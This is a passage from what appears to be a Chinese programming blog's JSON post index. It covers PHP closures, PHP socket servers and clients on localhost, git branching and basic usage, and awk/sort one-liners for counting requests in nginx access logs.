这个函数求一个数组的和，但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，而是返回求和的函数！ 12345678910function lazySum($arr)&#123; return function () use ($arr) &#123; return array_reduce($arr, function ($x, $y) &#123; return $x + $y; &#125;); &#125;;&#125;$sum &#x3D; lazySum($arr);var_dump($sum()); 结果是一样的，虽然这种写法有点奇怪 有一道面试题就涉及到了闭包的特性： 12345678910111213141516function plus()&#123; $funcArr &#x3D; []; for ($i &#x3D; 1; $i &lt;&#x3D; 3; $i++) &#123; $funcArr[] &#x3D; function () use (&amp;$i) &#123; return $i * $i; &#125;; &#125; return $funcArr;&#125;$res &#x3D; plus();var_dump($res[0]());var_dump($res[1]());var_dump($res[2]()); plus 函数会返回3个闭包函数，然后依次调用这个几个函数, 有人以为结果可能是1,4,9，其实结果都是16，需要注意的是use 那里使用的是引用传递，这就意味着在生成这3个闭包函数的时候i的值并不是循环的时候的1,2,3，而且到最后 $i++ 之后的值也就是 4，这说明闭包函数是调用的时候才会执行。 四.闭包在PHP框架里面使用1.一个是IOC容器 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?php&#x2F;** * 闭包的使用IOC * Class Container *&#x2F;class Container&#123; protected static $bindings; public static function bind(string $abstract, Closure $concrete) &#123; static::$bindings[$abstract] &#x3D; $concrete; &#125; public static function make(string $abstract) &#123; return call_user_func(static::$bindings[$abstract]); &#125;&#125;class talk&#123; public function greet($target) &#123; echo &quot;Hello &quot; . $target-&gt;getName(); &#125;&#125;class say&#123; public function getName() &#123; return &quot;World\\n&quot;; &#125;&#125;$talk &#x3D; new talk();Container::bind(&#39;foo&#39;, function () &#123; return new say();&#125;);$talk-&gt;greet(Container::make(&#39;foo&#39;)); 接触过laravel框架的应该都见过这种写法，laravel框架称之为服务容器，其设计思想基本上就是这样，也就是在框架初始化的时候注册绑定一堆服务，然后框架里面随时就可以调用这些服务了。 2.闭包路由 123456789101112131415161718192021222324252627282930&#x2F;** * 演示闭包的使用,路由 * Class App *&#x2F;class App&#123; protected $routes &#x3D; []; protected $responseStatus &#x3D; &#39;200 OK&#39;; protected $responseContentType &#x3D; &#39;text&#x2F;html&#39;; protected $responseBody &#x3D; &#39;Hello World&#39;; public function addRoute(string $path, Closure $callback) &#123; $this-&gt;routes[$path] &#x3D; $callback-&gt;bindTo($this, __CLASS__); &#125; public function dispatch(string $path) &#123; foreach ($this-&gt;routes as $routePath &#x3D;&gt; $callback) &#123; if ($routePath &#x3D;&#x3D;&#x3D; $path) &#123; $callback(); &#125; &#125; header(&#39;HTTP&#x2F;1.1 &#39; . $this-&gt;responseStatus); header(&#39;Content-Type: &#39; . $this-&gt;responseContentType); header(&#39;Content-Length: &#39; . mb_strlen($this-&gt;responseBody)); echo $this-&gt;responseBody; &#125;&#125; 123456789require &#39;App.php&#39;;$app &#x3D; new App();$app-&gt;addRoute(&quot;&#x2F;&quot;, function () &#123; $this-&gt;responseBody &#x3D; &quot;Hello Closure!\\n&quot;;&#125;);$app-&gt;dispatch(&quot;&#x2F;&quot;);","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"Closure","slug":"Closure","permalink":"https://wangbjun.github.io/tags/Closure/"}]},{"title":"PHP Socket 网络编程","slug":"php-socket-programing","date":"2018-04-05T11:00:03.000Z","updated":"2020-01-08T09:43:32.173Z","comments":true,"path":"2018/04/05/php-socket-programing/","link":"","permalink":"https://wangbjun.github.io/2018/04/05/php-socket-programing/","excerpt":"前言在做PHP开发的过程中，大部分我们都在和http协议打交道，在ISO模型里面，http属于应用层协议，它底层会用到TCP协议。http协议非常简单，它是一个文本协议，一个请求对应一个响应，客户端发起一个请求，服务端响应这个请求。http是一个一问一答的对话，每次请求都得重新建立对话（这里暂不讨论Keep-Alive），如果你想通过一个请求进行多次对话，那就是长连接通信，必须使用TCP或者UDP协议。 互联网运行的基石是建立在一些协议上的，目前而言主要是TCP/IP协议族，大部分协议都是公开开放的，计算机遵循这些协议我们才能通信，当然也有一些私有协议，私有协议只有自己知道如何去解析，相当来说更安全，比如QQ所用的协议就是自己定义的。在ISO模型里面，咱们常用的有http、ftp、ssh、dns等，但是不常用的数不胜数，发明一个协议不难，难的是如何设计的更好用，而且大家都喜欢用。 SocketSocket并不是一个协议，本质上说Socket是对 TCP/IP 协议的封装，它是一组接口，在设计模式中，Socket 其实就是一个门面（facade）模式，它把复杂的 TCP/IP 协议族隐藏在 Socket 接口后面，对用户来说，一组简单的接口就是全部，让 Socket 去组织数据，以符合指定的协议。","text":"前言在做PHP开发的过程中，大部分我们都在和http协议打交道，在ISO模型里面，http属于应用层协议，它底层会用到TCP协议。http协议非常简单，它是一个文本协议，一个请求对应一个响应，客户端发起一个请求，服务端响应这个请求。http是一个一问一答的对话，每次请求都得重新建立对话（这里暂不讨论Keep-Alive），如果你想通过一个请求进行多次对话，那就是长连接通信，必须使用TCP或者UDP协议。 互联网运行的基石是建立在一些协议上的，目前而言主要是TCP/IP协议族，大部分协议都是公开开放的，计算机遵循这些协议我们才能通信，当然也有一些私有协议，私有协议只有自己知道如何去解析，相当来说更安全，比如QQ所用的协议就是自己定义的。在ISO模型里面，咱们常用的有http、ftp、ssh、dns等，但是不常用的数不胜数，发明一个协议不难，难的是如何设计的更好用，而且大家都喜欢用。 SocketSocket并不是一个协议，本质上说Socket是对 TCP/IP 协议的封装，它是一组接口，在设计模式中，Socket 其实就是一个门面（facade）模式，它把复杂的 TCP/IP 协议族隐藏在 Socket 接口后面，对用户来说，一组简单的接口就是全部，让 Socket 去组织数据，以符合指定的协议。 下图展示了Socket在ISO模型里面大概位置： PHP Socket虽然PHP的强项是处理文本，一般用来写网页和http接口，但是官方依然提供了Socket扩展，编译PHP时在配置中添加–enable-sockets 配置项来启用，如果使用apt或yum安装，默认情况下是已启用。 官方文档里面列出了大概40个函数，但是常用的也就那几个，跟着文档，咱们一起来学学如何使用，首先声明一下，本人对Socket编程并不熟悉，如有错误的地方，希望大家指出来。 咱们先看一幅图，关于TCP客户端和服务端之间的通信过程，咱们平时写http接口的时候并未做这么多工作，那是客户端给封装好了： 1.服务端代码12345678910111213141516171819202122&lt;?phpset_time_limit(0);$ip = '127.0.0.1';$port = 8888;$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_bind($sock, $ip, $port);socket_listen($sock, 4);echo \"Server Started, Listen On $ip:$port\\n\";$accept = socket_accept($sock);socket_write($accept, \"Hello World!\\n\", 8192);$buf = socket_read($accept, 8192);echo \"Receive Msg： \" . $buf . \"\\n\";socket_close($sock); 简单说一下,为便于演示，所以省略了所有的错误处理代码，可以看到分为create、bind、listen、accept、write\\read、close这几步，看上去非常简单！具体参数大家可以看一下文档！在服务端启动之后，当收到一个请求之后，我们首先返回了一个Hello World\\n,然后又读取了8192个字节的数据，打印出来！最后关闭连接。 由于这里，咱还没有写客户端，所以暂时使用curl访问一下，运行效果如下： ===&gt;服务端： ===&gt;客户端： 从这个例子里面我们可以看出来，curl发出是一个标准的http请求，实际上它的每一行后面是有\\n的，在http协议里面，这几行文本其实是头（header）,但是在这个例子里面，对于我们来说，它就是一段文本而已，服务端只是把它的内容打印出来了,并没有去按照http协议去解析。虽然我们返回了Hello World！\\n，但是这也并没有按照http协议的格式去做，缺少响应头。我只能说curl比较强大，如果使用浏览器访问的话会失败，提示127.0.0.1 sent an invalid response。 但是稍加改造，我们就可以返回一个标准的http响应： 1234567$response = \"HTTP/1.1 200 OK\\r\\n\";$response .= \"Server: Socket-Http\\r\\n\";$response .= \"Content-Type: text/html\\r\\n\";$response .= \"Content-Length: 13\\r\\n\\r\\n\";$response .= \"Hello World!\\n\";socket_write($accept, $response, 8192); 这时候如果再用浏览器访问，就可以看到 Hello World!了，但是这个服务端目前是一次性的，就是说它只能处理一次请求，然后就结束了，正常的服务端是可以处理多次请求的，很简单，加一个死循环就行了！ 只贴一下改动的部分，代码如下： 1234567891011121314151617while (true) &#123; $accept = socket_accept($sock); $buf = socket_read($accept, 8192); echo \"Receive Msg： \" . $buf . \"\\n\"; $response = \"HTTP/1.1 200 OK\\r\\n\"; $response .= \"Server: Socket-Http\\r\\n\"; $response .= \"Content-Type: text/html\\r\\n\"; $response .= \"Content-Length: 13\\r\\n\\r\\n\"; $response .= \"Hello World!\\n\"; socket_write($accept, $response, 8192); socket_close($accept);&#125; 摇身一变，就是一个http服务了，使用ab测了一下，并发上万，是不是有点小激动？ 然而，之所以这么快是因为逻辑简单，假如你在while里面任何位置加一个 sleep(1) 你就会发现，原来这特么是串行的，一个个执行的，并不是并行，这段脚本一次只能处理一个请求！ 解决这个问题方法有很多种，具体可以参考 PHP并发IO编程之路, 看看前半段就行了，后半段是广告！该文章总结了3种方法：最早是采用多进程多线程方式，由于进程线程开销大，这种方式效率最低。后来演进出master-worker模型，也就是类似现在fpm采用的方式。目前最先进的方式就是异步io多路复用，基于epoll实现的。理论上讲C能实现的，PHP都能通过扩展去实现，而且PHP确实提供了相关扩展，其思想和C写的都差不多，然而今天咱不是说高并发编程的，还是接着说Socket吧！ 2.客户端代码之前的例子里面我们使用的是curl访问的，也可以使用浏览器或者telnet，这些工具都可以算作是客户端，客户端也可以自己实现。 1234567891011121314151617181920set_time_limit(0);$port = 8888;$ip = '127.0.0.1';$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);echo \"Connecting $ip:$port\\n\";socket_connect($sock, $ip, $port);$input = \"Hello World Socket\";socket_write($sock, $input, strlen($input));$out = socket_read($sock, 8192);echo \"Receive Msg: $out\\n\";socket_close($sock); 这段代码同样省略了错误处理代码，可以看到第一步都是create，但是第二步变成connect，然后是read\\write、最后close。 具体运行效果这里不再展示，和curl访问没多大区别，但是这个客户端也是一次性的，执行完了就结束！ 实例接下来，我们来写一个基于TCP通信的应用，这个应用非常简单，就是加减乘除！ (1)服务端代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpset_time_limit(0);$ip = '127.0.0.1';$port = 8888;$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_bind($sock, $ip, $port);socket_listen($sock, 4);echo \"Server Started, Listen On $ip:$port\\n\";while (true) &#123; $accept = socket_accept($sock); $buf = socket_read($accept, 8192); echo \"Receive Msg： \" . $buf . \"\\n\"; $params = json_decode($buf, true); $m = $params['m']; $a = $params['a']; $b = $params['b']; switch ($m) &#123; case '+'; $response = $a + $b; break; case '-'; $response = $a - $b; break; case '*'; $response = $a * $b; break; case '/'; $response = $a / $b; break; default: $response = $a + $b; &#125; socket_write($accept, $response.\"\\n\", 8192); socket_close($accept);&#125; (2)客户端代码： 12345678910111213141516171819202122232425&lt;?phpset_time_limit(0);$port = 8888;$ip = '127.0.0.1';$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);echo \"Connecting $ip:$port\\n\";socket_connect($sock, $ip, $port);$input = json_encode([ 'a' =&gt; 15, 'b' =&gt; 10, 'm' =&gt; '+']);socket_write($sock, $input, strlen($input));$out = socket_read($sock, 8192);echo \"Receive Msg: $out\\n\";socket_close($sock); 在这些代码里面，我按照自己的需求定义了一个“协议”，我把需要运算的数和方式通过一个json数组传输，约定了一个格式，这个协议只有我自己清楚，所以只有我才知道怎么调用。服务端在接受到参数之后，通过运算得出结果，然后把结果返回给客户端。 但是这个例子还有问题，客户端依然是一次性的，参数都被硬编码在代码里面，不够灵活，最关键是没有用到TCP长连接的特性，我们每次计算都得重新发起请求、重新建立连接，实际上，我需要的是一次连接，多次对话，也就是进行多次计算！ 目前为止，这些演示代码都没有复用连接，因为在服务端最后我close了这个连接，这意味着每次都是一个新的请求，如果是http服务的话尚且可以用一下，如何去实现一个TCP长连接呢？ IO多路复用之selectselect系统调用的目的是在一段指定时间内，监听用户感兴趣的文件描述符上的可读、可写和异常事件，虽然这个方式也比较低效，但是不妨了解一下，通过这种方式我们可以复用连接，完整的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpset_time_limit(0);$ip = '127.0.0.1';$port = 8888;$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_bind($sock, $ip, $port);socket_listen($sock, 4);echo \"Server Started, Listen On $ip:$port\\n\";socket_set_nonblock($sock);$clients = [];while (true) &#123; $rs = array_merge([$sock], $clients); $ws = []; $es = []; //监听文件描述符变动 $ready = socket_select($rs, $ws, $es, 3); if (!$ready) &#123; continue; &#125; if (in_array($sock, $rs)) &#123; $clients[] = socket_accept($sock); $key = array_search($sock, $rs); unset($rs[$key]); &#125; foreach ($rs as $client) &#123; $input = socket_read($client, 8096); if ($input == null) &#123; $key = array_search($client, $clients); unset($clients[$key]); continue; &#125; echo \"input: \" . $input; //解析参数，计算结果 preg_match(\"/(\\d+)(\\W)(\\d+)/\", $input, $params); if (count($params) === 4) &#123; $a = intval($params[1]); $b = intval($params[3]); $m = $params[2]; &#125; else &#123; continue; &#125; switch ($m) &#123; case '+'; $result = $a + $b; break; case '-'; $result = $a - $b; break; case '*'; $result = $a * $b; break; case '/'; $result = $a / $b; break; default: $result = $a + $b; &#125; $output = \"output: $result\\n\"; echo $output; socket_write($client, $output, strlen($output)); &#125;&#125; 然后我使用了telnet连接服务端进行操作，运行效果如下，一个基于TCP长连接的网络版简易计算器： 在这个例子，传参的“协议”稍微有点变化，只是为了更方便在telnet里面交互，但是很容易理解。这里面最关键是定义了一个全局变量用来存储连接资源描述符，然后通过select去监听变化,最后遍历整个数组，读取\\写入数据！ 总结通过上面的简单介绍，希望大家都对PHP Socket编程有一些了解和认识，其实作为Web开发来说，很少会用到裸TCP去连接，大部分时候都是使用基于TCP的http协议，只有涉及到一些对响应速度要求非常高的应用，比如说游戏、实时通信、物联网才会用到，如果真的用到，不妨尝试一下Workman、Swoole这些成熟的框架！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"Socket","slug":"Socket","permalink":"https://wangbjun.github.io/tags/Socket/"}]},{"title":"Git最简单的分支操作教程","slug":"git-branch-usage","date":"2018-02-15T04:13:41.000Z","updated":"2020-01-09T08:04:52.130Z","comments":true,"path":"2018/02/15/git-branch-usage/","link":"","permalink":"https://wangbjun.github.io/2018/02/15/git-branch-usage/","excerpt":"之前那篇文章，只是简单讲了一下git最基础最简单的用法，但是git还有一个非常重要的功能就是分支，默认情况下只有一个master分支，我们可以直接在master分支开发，完全没问题，但是当你的项目有十几个甚至几十个人同时在开发的时候，如果都使用master分支，就会非常容易出现冲突、甚至出现代码被覆盖的问题，而且上线也是个问题，你不知道哪些文件可以上，哪些不可以上，很容易把一些未经测试的代码上线，这时候就需要启用分支功能。","text":"之前那篇文章，只是简单讲了一下git最基础最简单的用法，但是git还有一个非常重要的功能就是分支，默认情况下只有一个master分支，我们可以直接在master分支开发，完全没问题，但是当你的项目有十几个甚至几十个人同时在开发的时候，如果都使用master分支，就会非常容易出现冲突、甚至出现代码被覆盖的问题，而且上线也是个问题，你不知道哪些文件可以上，哪些不可以上，很容易把一些未经测试的代码上线，这时候就需要启用分支功能。 1. git branch默认情况下我们都是在master分支下，我们可以使用 git branch 命令查看当前所在分支： 12jwang@jwang:~/git_demo$ git branch* master 使用 -r 参数可以查看远程分支的情况： 123jwang@jwang:~/git_demo$ git branch -r origin/HEAD -&gt; origin/master origin/master 如果需要创建分支，则只需在 git branch 加上分支的名称即可，如果你想新建一个dev分支，操作如下： 1234jwang@jwang:~/git_demo$ git branch devjwang@jwang:~/git_demo$ git branch dev* master 这里可以看到我们已经创建了一个dev分支，但是这时候我们还在master分支，并没有切换到dev分支。 2. git checkout这个命令之前说过，但是在分支里面它还有另一个功能，那就是切换分支，比如如果你想切换到dev分支，用法如下： 12345jwang@jwang:~&#x2F;git_demo$ git checkout devSwitched to branch &#39;dev&#39;jwang@jwang:~&#x2F;git_demo$ git branch* dev master 这时候我们所有的pull，commit，push操作都是在当前dev分支，并不影响master分支，可见分支一大好处就是隔离代码，开一个分支写啥都行，不会影响其它人。 但是有一点需要注意，当你在dev分支使用 git push 推代码的时候你可能会遇到下面这个问题： 1234fatal: The current branch dev has no upstream branch.To push the current branch and set the remote as upstream, use git push --set-upstream origin dev 这个报错的意思是当前分支没有上游分支，什么意思呢？之前说过这个，在默认情况下，git push使用simple模式，只会把代码推送到你 git pull 拉取代码的分支上，但是这是远程服务器并没有dev分支，我们只是在本地创建了这个dev分支。 但是这个很容易解决，我们只需要这么做 git push origin dev 就可以： 123456789101112131415jwang@jwang:~/git_demo$ git push origin devUsername for 'https://github.com': wangbenjun@gmail.comPassword for 'https://wangbenjun@gmail.com@github.com': Counting objects: 3, done.Delta compression using up to 12 threads.Compressing objects: 100% (2/2), done.Writing objects: 100% (3/3), 282 bytes | 0 bytes/s, done.Total 3 (delta 1), reused 0 (delta 0)remote: Resolving deltas: 100% (1/1), completed with 1 local object.remote: remote: Create a pull request for 'dev' on GitHub by visiting:remote: https://github.com/wangbjun/git_demo/pull/new/devremote: To https://github.com/wangbjun/git_demo * [new branch] dev -&gt; dev 不过为了方便以后提交代码，我们可以使用 git push --set-upstream origin dev 命令设置上游分支，这样我们在使用 git pull、git push 命令的时候就不会报错了，它会默认跟踪dev分支。 第一次使用git的人会很好奇这个origin到底是啥意思？按我的理解，这个origin其实就是指远程分支，git pull origin dev命令就是从远程的dev分支上拉代码。当然你可以在从master或者其它分支拉取代码，不过一般不建议从其它远程分支拉代码。 3. git merge当你在这个dev分支完成开发，测试也没问题了，你就需要把这个dev分支合并到master分支，这时候就需要使用merge命令，这个命令需要明白是把谁合并到谁。假如你在dev分支执行 git merge master，这就表示是把master分支合并到dev，最终代码在dev上。有些新手会理解错为把dev分支合并到master，这点需要注意。 在哪个分支上面合并都一样，你也可以在master分支上合并dev，反正最终都是一份代码，但是从项目管理的角度来说，应该先在dev分支合并master，然后再测试，因为master分支可能已经有别人提交的新的修改，你需要把这些修改合并过来。 说到分支就不得不说到冲突，这是很多新人最害怕的事情，所谓冲突就是2个人在不同分支改动了同一行代码，这时候git就懵逼了，我到底保留哪一份呢？按提交时间先后顺序？最靠谱的方式当然是把冲突留给合并代码的人解决。 有很多新人不知道怎么解决冲突就直接把别人写的代码覆盖掉了。。。这样的事情很常见，虽然git有历史记录，代码丢是丢不了，但是解决冲突确实是个非常棘手的事情。 为了解决冲突，你必须对你所写的代码了解，同时需要和另外一个修改代码的人沟通，2个人协商一下最后保留哪些代码，千万不能一意孤行。讲道理，如果一个项目结构分层合理，同时你又是经常pull代码的话，冲突是很少见的。 1234jwang@jwang:~/git_demo$ git merge masterAuto-merging README.mdCONFLICT (content): Merge conflict in README.mdAutomatic merge failed; fix conflicts and then commit the result. 解决冲突的方式其实不不难，使用图形化界面工具最方便，如果你不使用，你只需要找到发生冲突的文件，一般内容会如下： 12345678910111213141516171819# git_demogit demoThis is a Test!function add($a, $b)&#123; return $a+$b;&#125;&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADecho \"This is a dev!\";$a = add(1,2);var_dump($a);=======nothing to say&gt;&gt;&gt;&gt;&gt;&gt;&gt; master 请注意 &lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD …code… ======= …code… &gt;&gt;&gt;&gt;&gt;&gt;&gt; master 这3个标识中间的代码，其中上半段代码表示的是目前分支的代码，下半段表示的是master分支的代码。 你只需根据自己的需求删掉不需要的代码，保留需要的就行，比如说在这个例子里面，我只想删掉var_dump，我就可以这样改： 123456789101112131415# git_demogit demoThis is a Test!function add($a, $b)&#123; return $a+$b;&#125;echo \"This is a dev!\";$a = add(1,2);nothing to say 然后重新commit就行，最后如果没问题的话push就行。 一般情况下，如果你不解决冲突的话是不允许你push代码的，但是你可以强制push，这样就会把冲突的代码（其实就是上面带着&lt;&lt;&lt;&lt;&lt;符号的代码）push到远程分支，这样当然是不好滴，千万不要干这种坑事。 总结：在实际开发中，我们一般遵循大概这样的流程，比如小A和小B现在要开始做一个项目的大功能，这个功能开发周期比较长，这时候由小A创建开发分支，小A的操作如下： 123456781.小A首先切换到master分支： git checkout master2.然后更新代码： git pull3.创建功能分支： git branch -b new_feature4.提交分支到远程服务器供小B拉取： git push origin new_feature5.小B拉取功能分支： git checkout new_feature &amp;&amp; git pull6.期间小A和小B共同开发，不停的pull和push7.功能开发完成，测试完成后合并到master分支，解决可能出现的冲突8.切换到master分支，合并dev，最后提交代码到远程仓库，如果没问题的话就可以上线了 这是最简单的一个分支用法，可以保证一组人在同一个分支开发，同时不会影响线上的代码。对于复杂的项目我建议可以参考 git flow 模型的用法，更加专业合理。","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://wangbjun.github.io/tags/Git/"}]},{"title":"Git最简单的基础入门教程","slug":"git-base-usage","date":"2018-02-10T04:05:45.000Z","updated":"2020-01-09T08:05:18.014Z","comments":true,"path":"2018/02/10/git-base-usage/","link":"","permalink":"https://wangbjun.github.io/2018/02/10/git-base-usage/","excerpt":"现在很多公司都用git来管理代码，老一些的项目可能还在用svn，git比svn好的地方就在于其便利的分支管理功能，特别适用于多人协作开发，当年祖师爷linus开发git就是为了方便Linux操作系统的开发。 git的基本用法很简单: 拉代码、提交变更、推代码！大部分公司都有自己内部的git服务器，一般都是使用gitlab，主要是安全和省钱，当然也有公司直接使用github的付费服务！不管咋样，你都需要拿到一个项目的git地址, 为了方便演示，我在github上面创建了一个演示的仓库，里面目前只有一个README.md文件：","text":"现在很多公司都用git来管理代码，老一些的项目可能还在用svn，git比svn好的地方就在于其便利的分支管理功能，特别适用于多人协作开发，当年祖师爷linus开发git就是为了方便Linux操作系统的开发。 git的基本用法很简单: 拉代码、提交变更、推代码！大部分公司都有自己内部的git服务器，一般都是使用gitlab，主要是安全和省钱，当然也有公司直接使用github的付费服务！不管咋样，你都需要拿到一个项目的git地址, 为了方便演示，我在github上面创建了一个演示的仓库，里面目前只有一个README.md文件： 1. git clone首先，你需要使用 git clone 拷贝一份项目代码到你自己的电脑，这个命令很简单就不多说了！ 1234567jwang@jwang:~$ git clone https://github.com/wangbjun/git_demo.gitCloning into 'git_demo'...remote: Enumerating objects: 3, done.remote: Counting objects: 100% (3/3), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.Checking connectivity... done. 2. git pull前面那步clone代码到本地之后那就可以写你自己的代码了，不过在你提交代码前我强烈建议你先更新一下代码！而且每次开始写代码之前最好都先pull一下，这样可以减少冲突，就算有冲突也可以提前发现解决！ 有些人长时间不pull，到最后过了很多天提交的时候一大堆冲突，根本没法merge，很坑，所以我建议大家有空就pull，绝对是没毛病的！ 3. git status改完之后当然要提交代码了，使用 git status 可以显示有哪些文件有修改！ 12345678910jwang@jwang:~/git_demo$ git statusOn branch masterYour branch is up-to-date with 'origin/master'.Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory) modified: README.mdno changes added to commit (use \"git add\" and/or \"git commit -a\") 4. git add如果你改动了多个文件但是你只想提交其中的某几个文件，你就需要使用 git add 命令添加改动的文件，在这个例子里面，就是 git add READEM.md。 4-1. git checkout如果你不想提交改动的文件，而且想撤销之前自己的更改，那你就可以使用 git checkout 命令, 在这个例子里面，就是 git checkout READEM.md。 5. git commit这是紧接着第4步的，假设你已经使用 git add 命令添加了自己需要提交的文件，这时候就需要使用 git commit 来提交自己的修改，通常执行这个命令会弹出一个对话框让你添加提交信息，提交信息就是相对于一个备注吧！ 在Linux下面默认使用的是nano编辑器，很多人看到这个对话框会很懵，不知道咋用，这和vim的操作完全不一样，但也不难，直接输入你想写的内容，然后按 Ctrl+X 就会弹出一个选项，按 Y，最后回车就可以了 如果你实在不习惯这个编辑器，可以更改成vim，使用 git config --global core.editor vim 命令，如果你连vim都不会用。。。我建议你可以不用看下去了，下载一个图形化界面的工具吧，或者使用IDE也行，比如idea，eclipse都有自带git插件可以使用。 有一个小操作，假如你修改了很多文件，而且都需要提交，你就不必一个个 git add，跳过第4步，直接使用 git commit -a即可。 6. git push最后一步，如果你只需本地使用git，这步就不需要了，但是大部分时候我们需要把自己的修改提交到远程仓库，让别人也能拉取看到，这时候我们就需要使用 git push 命令推代码。 123456789101112131415161718192021jwang@jwang:~/git_demo$ git pushwarning: push.default is unset; its implicit value has changed inGit 2.0 from 'matching' to 'simple'. To squelch this messageand maintain the traditional behavior, use: git config --global push.default matchingTo squelch this message and adopt the new behavior now, use: git config --global push.default simpleWhen push.default is set to 'matching', git will push local branchesto the remote branches that already exist with the same name.Since Git 2.0, Git defaults to the more conservative 'simple'behavior, which only pushes the current branch to the correspondingremote branch that 'git pull' uses to update the current branch.See 'git help config' and search for 'push.default' for further information.(the 'simple' mode was introduced in Git 1.7.11. Use the similar mode'current' instead of 'simple' if you sometimes use older versions of Git) 请注意上面一些提示，其大概意思是自从 git 2.0版本开始，默认使用 “simple” 模式提交代码，simple模式是只会把代码提交到你 git pull 命令拉取代码的分支。其实意思就是你从哪个分支拉取的代码就会默认push到哪个分支，一般情况下我们不需要更改这个。 总结：其实最常用的也就是这几个命令，git clone 只需要最开始执行一次，平时用的最多的就是 git commit 和 git push，只要掌握这几个命令就可以了。 当你使用IDE或者一些图形化界面工具时更简单，比如我常用的PHPStorm (idea全家桶快捷键都一样), 快捷键 Ctrl+T 就是pull，Ctrl+K 可以列出所有修改文件，默认勾选所有修改过的文件，填一下提交信息，回车就是commit了。然后 Ctrl+Shift+K 就是push代码，如果不需要修改默认设置，直接回车就行，熟练操作的话非常方便，比使用命令行的效率高很多。 使用IDE还可以非常方便的查看历史记录、reset代码、合并分支、对比代码，但是命令行也是需要掌握的，毕竟有时候在服务器上面可木有图形化界面工具。。。 接下来，我会继续给大家讲讲git分支相关的操作！","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://wangbjun.github.io/tags/Git/"}]},{"title":"Nginx Log日志统计分析常用命令","slug":"nginx-log-parse","date":"2018-02-03T05:22:00.000Z","updated":"2020-01-08T17:44:37.403Z","comments":true,"path":"2018/02/03/nginx-log-parse/","link":"","permalink":"https://wangbjun.github.io/2018/02/03/nginx-log-parse/","excerpt":"（网上抄的，留个记录） 1.统计IP访问量（独立ip访问数量） 1awk &#39;&#123;print $1&#125;&#39; access.log | sort -n | uniq | wc -l 2.查看某一时间段的IP访问量(4-5点) 1grep &quot;07&#x2F;Apr&#x2F;2017:0[4-5]&quot; access.log | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c| sort -nr | wc -l 3.查看访问最频繁的前100个IP 1awk &#39;&#123;print $1&#125;&#39; access.log | sort -n |uniq -c | sort -rn | head -n 100 4.查看访问100次以上的IP 1awk &#39;&#123;print $1&#125;&#39; access.log | sort -n |uniq -c |awk &#39;&#123;if($1 &gt;100) print $0&#125;&#39;|sort -rn","text":"（网上抄的，留个记录） 1.统计IP访问量（独立ip访问数量） 1awk &#39;&#123;print $1&#125;&#39; access.log | sort -n | uniq | wc -l 2.查看某一时间段的IP访问量(4-5点) 1grep &quot;07&#x2F;Apr&#x2F;2017:0[4-5]&quot; access.log | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c| sort -nr | wc -l 3.查看访问最频繁的前100个IP 1awk &#39;&#123;print $1&#125;&#39; access.log | sort -n |uniq -c | sort -rn | head -n 100 4.查看访问100次以上的IP 1awk &#39;&#123;print $1&#125;&#39; access.log | sort -n |uniq -c |awk &#39;&#123;if($1 &gt;100) print $0&#125;&#39;|sort -rn 5.查询某个IP的详细访问情况,按访问频率排序 1grep &#39;127.0.0.1&#39; access.log |awk &#39;&#123;print $7&#125;&#39;|sort |uniq -c |sort -rn |head -n 100 6.查看访问最频的页面(TOP100) 1awk &#39;&#123;print $7&#125;&#39; access.log | sort |uniq -c | sort -rn | head -n 100 7.查看访问最频的页面([排除php页面】(TOP100) 1grep -v &quot;.php&quot; access.log | awk &#39;&#123;print $7&#125;&#39; | sort |uniq -c | sort -rn | head -n 100 8.查看页面访问次数超过100次的页面 1cat access.log | cut -d &#39; &#39; -f 7 | sort |uniq -c | awk &#39;&#123;if ($1 &gt; 100) print $0&#125;&#39; | less 9.查看最近1000条记录，访问量最高的页面 1tail -1000 access.log |awk &#39;&#123;print $7&#125;&#39;|sort|uniq -c|sort -nr|less 10.统计每秒的请求数,top100的时间点(精确到秒) 1awk &#39;&#123;print $4&#125;&#39; access.log |cut -c 14-21|sort|uniq -c|sort -nr|head -n 100&#39; 11.统计每分钟的请求数,top100的时间点(精确到分钟) 1awk &#39;&#123;print $4&#125;&#39; access.log |cut -c 14-18|sort|uniq -c|sort -nr|head -n 100 12.统计每小时的请求数,top100的时间点(精确到小时) 1awk &#39;&#123;print $4&#125;&#39; access.log |cut -c 14-15|sort|uniq -c|sort -nr|head -n 100 13.性能分析,在nginx log中最后一个字段加入$request_time 列出传输时间超过 3 秒的页面，显示前20条 1cat access.log|awk &#39;($NF &gt; 3)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -20 列出php页面请求时间超过3秒的页面，并统计其出现的次数，显示前100条 1cat access.log|awk &#39;($NF &gt; 1 &amp;&amp; $7~&#x2F;\\.php&#x2F;)&#123;print 